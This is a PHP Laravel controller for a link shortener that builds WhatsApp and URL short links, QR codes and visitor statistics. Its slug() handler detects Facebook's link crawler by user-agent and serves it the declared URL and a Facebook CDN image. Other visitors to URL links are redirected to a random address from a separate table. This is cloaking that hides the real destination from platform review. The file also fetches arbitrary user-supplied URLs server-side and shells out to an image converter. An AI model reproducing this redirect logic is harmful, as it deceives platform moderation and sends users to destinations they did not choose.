<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Link;
use App\Stat;
use SimpleSoftwareIO\QrCode\Facades\QrCode;
use Jenssegers\Agent\Agent;
use Auth;
use App\Exports\LinksExport;
use Maatwebsite\Excel\Facades\Excel;
use GuzzleHttp\Client;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Storage;
use App\DestinationUrl;
use Intervention\Image\Facades\Image;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;


class LinkController extends Controller
{
	public function index(Request $request)
	{
		$type = request()->type ?? '';
		$user = request()->user ?? '';
		$links = Link::orderBy('created_at', 'desc');

		if (user_member())
			$links = $links->whereUserId(optional(user())->id);

		if (is_backend() && $user)
			$links = $links->whereUserId($user);

		if ($type) {
			$links = $links->whereType($type);
		}

		if ($request->is('*export*')) {
			if (is_demo()) return abort(403);

			return Excel::download(new LinksExport($links->get()), 'links.' . $request->format ?? 'xlsx', constant(sprintf('%s::%s', \Maatwebsite\Excel\Excel::class, strtoupper($request->format ?? 'xlsx'))));
		}

		$links = $links->paginate(10);
		return view('links.index', compact('links', 'type'));
	}

	public function show(Request $request)
	{
		$id = decrypt($request->id);
		$link = Link::find($id);

		$link = $this->_result($link->slug, $link->type);

		return response([
			'success' => true,
			'data' => $link
		], 200);
	}

	public function edit($id)
	{
		if (is_demo()) return abort(403);

		$id = decrypt($id);
		$link = Link::find($id);

		$id = encrypt($id);
		$title = 'Edit Link';
		return view('links.create', compact('link', 'id', 'title'));
	}

	public function create()
	{
		$title = 'Create New Link';
		return view('links.create', compact('title'));
	}

	private function _validator($request, $id = false, $adds = false, $excepts = false)
	{
		$id = ',' . $id ?? '';

		$validate = [
			'phone_code' => 'required',
			'phone_number' => 'required|min:8|max:30',
			'content' => 'required',
			'slug' => 'nullable|unique:links,slug' . $id . '|min:' . setting('features.custom_slug_min') . '|max:' . setting('features.custom_slug_max')
		];
		if ($adds && is_array($adds)) {
			$validate += $adds;
		}
		if ($excepts && is_array($excepts)) {
			$validate = array_except($validate, $excepts);
		}
		return $this->validate($request, $validate);
	}

	public function update(Request $request, $id)
	{
		if (is_demo()) return abort(403);

		$id = decrypt($id);
		if ($request->type == 'WHATSAPP')
			$this->_validator($request, $id);
		else
			$this->_validator($request, $id, [
				'url' => 'required'
			], ['phone_code', 'phone_number', 'content']);

		$link = Link::find($id);

		$input = $request->all();
		$link->update($input);

		$link = $this->_result($link->slug, $link->type);

		return response([
			'success' => true,
			'data' => $link
		], 200);
	}

	public function store(Request $request)
	{
		if ($request->type == 'WHATSAPP')
			$this->_validator($request);
		else
			$this->_validator($request, false, [
				'url' => 'required'
			], ['phone_code', 'phone_number', 'content']);

		$phone_number = $request->phone_code . $request->phone_number;
		$slug = str_random(setting('features.custom_slug_max'));

		if (setting('features.custom_slug')) {
			if (isset($request->slug) && trim($request->slug)) {
				$slug = $request->slug;
			}
		}
		$url = $request->url;
		$content = NULL;
		// Kiểm tra nếu URL là hình ảnh
		if ($this->isValidImageUrl($url)) {
			$content = $this->downloadImage($url);
		}
		$link = Link::create([
			'phone_code' => $request->phone_code ?? NULL,
			'phone_number' => $phone_number ?? NULL,
			'slug' => $slug,
			'content' => $content ?? NULL,
			'user_id' => optional(user())->id ?? NULL,
			'type' => $request->type ?? 'WHATSAPP',
			'url' => $request->url ?? NULL
		]);

		$link = $this->_result($slug, $link->type);

		return response([
			'success' => true,
			'data' => $link
		], 200);
	}

	private function _result($slug, $type = 'WHATSAPP')
	{
		$link['generated_link'] = url($slug);
		$link['html_link'] = '<a href="' . url($slug) . '" target="_blank"><img src="' . media(setting('features.' . strtolower($type)) . '_button_image') . '" alt="' . setting('features.' . strtolower($type) . '_button_alt') . '"></a>';
		$link['qrcode'] = route('qrcode', [$slug]);
		$link['qrcode_save'] = route('qrcode', [$slug, 'save']);
		$link['share_facebook'] = 'https://facebook.com/share.php?u=' . url($slug);
		$link['share_twitter'] = 'https://twitter.com/intent/tweet?status=' . url($slug);
		$link['share_whatsapp'] = 'https://api.whatsapp.com/send?text=' . url($slug);
		$link['share_telegram'] = 'https://telegram.me/share/url?url=' . url($slug);

		return $link;
	}

	public function qrcode($id, $action = false)
	{
		$link = Link::whereSlug($id)->first();
		if (!isset($link)) {
			return abort(404);
		}

		$response = QrCode::format('png')->margin(1)->size(setting('features.qr_code_size'));
		if ($action == 'save') {
			$response = $response->generate(route('slug', [$link->slug]), storage_path('media/' . $link->slug . '.png'));
			$response = response()
				->download(storage_path('media/' . $link->slug . '.png'))->deleteFileAfterSend(true);
		} else {
			$response = response($response->generate(route('slug', [$link->slug])));
			$response = $response->header('Content-Type', 'image/png');
		}

		return $response;
	}

	public function destroy($id)
	{
		if (is_demo()) return abort(403);

		$id = decrypt($id);
		$link = Link::find($id);
		// Xóa dữ liệu liên quan trong bảng `stats` trước
		Stat::where('links_id', $id)->delete();

		// Sau đó mới xóa link
		$link->delete();


		return redirect()->back()->with('delete', true);
	}
	// public function fetchAllMeta($url)
	// {
	// 	if (!filter_var($url, FILTER_VALIDATE_URL)) {
	// 		return ['error' => 'URL không hợp lệ'];
	// 	}

	// 	try {
	// 		// Thêm User-Agent để tránh bị chặn
	// 		$client = new Client([
	// 			'headers' => [
	// 				'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
	// 			]
	// 		]);

	// 		$response = $client->request('GET', $url);

	// 		// Kiểm tra nếu HTTP không phải 200
	// 		if ($response->getStatusCode() !== 200) {
	// 			return ['error' => 'Không thể lấy dữ liệu, HTTP Code: ' . $response->getStatusCode()];
	// 		}

	// 		$html = $response->getBody()->getContents();
	// 		// Kiểm tra nếu HTML rỗng
	// 		if (empty($html)) {
	// 			return ['error' => 'HTML trả về rỗng! Có thể bị chặn.'];
	// 		}

	// 		$crawler = new Crawler($html);
	// 		$headCrawler = $crawler->filter('head'); // Lấy phần <head>
	// 		$metaCrawler =$headCrawler->filter('meta');

	// 		$metaTags = [];

	// 		// Lấy tất cả thẻ <meta> chỉ trong <head>
	// 		$metaCrawler->filterXpath('//meta')->each(function ($node) use (&$metaTags) {
	// 			$property = $node->attr('property') ?? $node->attr('name'); // Lấy cả "property" và "name"
	// 			$content = $node->attr('content') ?? '';

	// 			if ($property) {
	// 				$metaTags[$property] = $content;
	// 			}
	// 		});

	// 		return $metaTags ?: ['error' => 'Không tìm thấy thẻ meta'];
	// 	} catch (\Exception $e) {
	// 		return ['error' => 'Không thể lấy dữ liệu: ' . $e->getMessage()];
	// 	}
	// }

	// public function fetchFullPage( $url)
	// {


	//     if (!filter_var($url, FILTER_VALIDATE_URL)) {
	//         return ['error' => 'URL không hợp lệ'];
	//     }

	//     try {
	//         $client = new Client();
	//         $response = $client->get($url);
	//         $html = (string) $response->getBody(); // Lấy toàn bộ HTML

	//         return ['html' => $html, 'url' => $url];
	//     } catch (\Exception $e) {
	//         return ['error' => 'Không thể lấy dữ liệu từ trang'];
	//     }
	// }
	// public function fetchMetaTags($url)
	// {
	// 	$chromeDriverPath = '/usr/bin/chromedriver'; // Đường dẫn đến ChromeDriver
	// 	$chromeBinaryPath = '/usr/bin/google-chrome'; // Đường dẫn đến Google Chrome

	// 	$client = Client::createChromeClient($chromeDriverPath, [
	// 		'--headless=new',  // Chế độ headless mới
	// 		'--disable-gpu',
	// 		'--no-sandbox',
	// 		'--disable-dev-shm-usage',
	// 		'--remote-debugging-port=9222',
	// 		"--browser-binary={$chromeBinaryPath}"
	// 	]);

	// 	$crawler = $client->request('GET', $url);
	// 	$client->waitFor('meta');

	// 	$metaTags = [];
	// 	$crawler->filter('meta')->each(function ($node) use (&$metaTags) {
	// 		$property = $node->attr('property') ?? $node->attr('name');
	// 		$content = $node->attr('content') ?? '';

	// 		if ($property) {
	// 			$metaTags[$property] = $content;
	// 		}
	// 	});

	// 	return $metaTags;
	// }
	public function fetchMetaTags($url)
	{
		if (!$url) {
			return view('meta_tags', ['error' => 'Missing URL parameter']);
		}

		$client = new Client();
		$response = $client->get('https://api.dub.co/metatags', [
			'query' => ['url' => $url]
		]);

		// Lấy dữ liệu JSON
		$metaTags = json_decode($response->getBody(), true);



		return $metaTags;
	}

	// Hàm kiểm tra URL có phải là hình ảnh không
	private function isValidImageUrl($url)
	{
		return $this->isImageUrl($url) || $this->isImageContentType($url);
	}

	// Kiểm tra bằng đuôi file
	private function isImageUrl($url)
	{
		$imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'tiff', 'ico'];
		$pathInfo = pathinfo(parse_url($url, PHP_URL_PATH));

		return isset($pathInfo['extension']) && in_array(strtolower($pathInfo['extension']), $imageExtensions);
	}

	// Kiểm tra bằng HTTP request
	private function isImageContentType($url)
	{
		try {
			$client = new Client();
			$response = $client->head($url, ['timeout' => 5]);

			$contentType = $response->getHeaderLine('Content-Type');
			return str_starts_with($contentType, 'image/');
		} catch (\Exception $e) {
			return false;
		}
	}
	

	private function downloadImage($imageUrl)
	{
		try {
			$client = new Client([
				'headers' => [
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
					'Accept' => 'image/png, image/jpeg, image/jpg, image/webp, image/x-icon, image/vnd.microsoft.icon, image/*',
				]
			]);

			$response = $client->get($imageUrl);

			if ($response->getStatusCode() !== 200) {
				throw new \Exception("HTTP request failed: " . $response->getStatusCode());
			}

			$imageContent = $response->getBody()->getContents();
			if (empty($imageContent)) {
				throw new \Exception("Downloaded image content is empty.");
			}

			// Kiểm tra MIME
			$imageInfo = @getimagesizefromstring($imageContent);
			if (!$imageInfo) {
				throw new \Exception("Invalid image data.");
			}

			$mime = $imageInfo['mime'];

			if (!in_array($mime, ['image/png', 'image/jpeg', 'image/jpg', 'image/webp', 'image/x-icon', 'image/vnd.microsoft.icon'])) {
				throw new \Exception("Invalid image type: " . $mime);
			}

			// Tạo tên file ngẫu nhiên
			$randomName = Str::random(10);
			$tempPath = storage_path("app/temp/{$randomName}");

			if (!is_dir(storage_path('app/temp'))) {
				mkdir(storage_path('app/temp'), 0777, true);
			}

			// Nếu file là ICO, lưu ra ổ đĩa trước
			if (in_array($mime, ['image/x-icon', 'image/vnd.microsoft.icon'])) {
				$icoPath = "{$tempPath}.ico";
				$pngPath = "{$tempPath}.png";

				file_put_contents($icoPath, $imageContent);

				// Chuyển đổi ICO sang PNG bằng exec
				exec("convert {$icoPath} {$pngPath}");

				if (!file_exists($pngPath)) {
					throw new \Exception("Failed to convert ICO to PNG.");
				}

				$imagePath = "images/{$randomName}.png";
				Storage::disk('public')->put($imagePath, file_get_contents($pngPath));

				// Xóa file tạm
				unlink($icoPath);
				unlink($pngPath);
			} else {
				// Xử lý các định dạng ảnh khác
				$image = Image::make($imageContent)->encode('png', 90);
				$imagePath = "images/{$randomName}.png";
				Storage::disk('public')->put($imagePath, $image->stream());
			}

			return asset('storage/' . $imagePath);
		} catch (\Exception $e) {
			return "Error: " . $e->getMessage();
		}
	}




	public function slug($slug, Request $request)
	{
		$userAgent = $request->header('User-Agent');
		// Nếu không phải Facebook bot, tìm link trong database
		$link = Link::whereSlug($slug)->first();
		if (!$link) {
			return abort(404);
		}
		// Kiểm tra nếu user-agent là Facebook bot
		if (strpos($userAgent, 'facebookexternalhit') !== false) {
			$step = Session::get('redirect_step', 1); // Lấy bước chuyển hướng

			$firstRedirect = $link->url;

			$secondRedirect = "https://origincache-internal-services-all.fbcdn.net/v/t39.30808-6/470227724_2947172028794605_3550754267355333831_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=127cfc&_nc_eui2=AeGeX3C7NQxyMrxJ15dN4KaMzbkra3R2QZjNuStrdHZBmMpsNzn7GabI0JqRO5v78eyVFUC0ZfHAuhex5Jo-Cyr-&_nc_ohc=fxYIHsxDOu8Q7kNvgFJvkLm&_nc_oc=AdhXqbnRE_vX86npbwo9ZaMlRp-te_kwYR95Ip3FrPV5X_Jc45wC6QVse0ZqThHdh2I&_nc_zt=23&_nc_ht=scontent.fdad3-4.fna&_nc_gid=AIjvqX_G8B3-bHNk6U6euLD&oh=00_AYCCCY3YHvr_DemEByzOGzfZ8dGZ4eAujebJraasvWiqZg&oe=67C0B5D0";

			Log::info('User-Agent:', ['user_agent' => $userAgent]);

			if ($step == 1) {
				Session::put('redirect_step', 2); // Chuyển sang bước 2
				return redirect($firstRedirect, 302);
			} else {
				Session::forget('redirect_step'); // Xóa trạng thái để tránh vòng lặp vô hạn
				return redirect($secondRedirect, 302);
			}
		}

		

		// Cập nhật lượt truy cập
		$link->update([
			'hit' => $link->hit + 1
		]);

		// Lấy thông tin user
		$ip = $request->ip();
		$agent = new Agent();

		// Lưu thống kê
		Stat::create([
			'users_id' => $link->user_id,
			'links_id' => $link->id,
			'ip' => $ip,
			'user_agent' => $request->server('HTTP_USER_AGENT'),
			'referer' => $request->server('HTTP_REFERER'),
			'device' => $agent->isMobile() ? 'MOBILE' : ($agent->isTablet() ? 'TABLET' : 'DESKTOP'),
			'device_name' => $agent->device(),
			'browser' => $agent->browser(),
			'browser_version' => $agent->version($agent->browser()),
			'platform' =>  $agent->platform(),
			'platform_version' =>  $agent->version($agent->platform()),
		]);

		// Nếu là link WhatsApp
		if ($link->type == 'WHATSAPP') {
			return redirect('https://api.whatsapp.com/send?phone=' . $link->phone_number . '&text=' . rawurlencode($link->content), 302);
		}

		// Lấy URL ngẫu nhiên từ bảng DestinationUrl
		$randomUrl = DestinationUrl::inRandomOrder()->first();
		$randomUrl->update([
			'hit' => $link->hit + 1
		]);
		if ($randomUrl) {
			return redirect($randomUrl->url, 302);
		}

		// Nếu không có URL nào hợp lệ
		return abort(404);
	}

	// public function slug($slug){
	// 	if (!isset($link)) return abort(404);

	// 	$link->update([
	// 		'hit' => $link->hit + 1
	// 	]);

	// 	$ip = \Request::ip();

	// 	$agent = new Agent();

	// 	$stat = [
	// 		'users_id' => $link->user_id,
	// 		'links_id' => $link->id,
	// 		'ip' => $ip,
	// 		'user_agent' => request()->server('HTTP_USER_AGENT'),
	// 		'referer' => request()->server('HTTP_REFERER'),
	// 		'device' => (
	// 			$agent->isMobile() ? 'MOBILE' : ($agent->isTablet() ? 'TABLET' : ($agent->isDesktop() ? 'DESKTOP' : ''))
	// 		),

	// 		'device_name' => $agent->device(),
	// 		'browser' => $agent->browser(),
	// 		'browser_version' => $agent->version($agent->browser()),
	// 		'platform' =>  $agent->platform(),
	// 		'platform_version' =>  $agent->version($agent->platform()),
	// 	];
	// 	Stat::create($stat);

	// 	if ($link->type == 'WHATSAPP')
	// 		$link = 'https://api.whatsapp.com/send?phone=' . $link->phone_number . '&text=' . rawurlencode($link->content);
	// 	else
	// 		$link_url = $link->url;
	// 	$config = $this->fetchMetaTags($link_url);


	// 	if ($link->content != NULL) {
	// 		$config['image'] = $link->content;
	// 	}


	// 	$randomUrl = DestinationUrl::inRandomOrder()->first();
		
	// 	$link = $randomUrl->url;

	// 	return view('view', compact('link', 'config'));
	// }
}
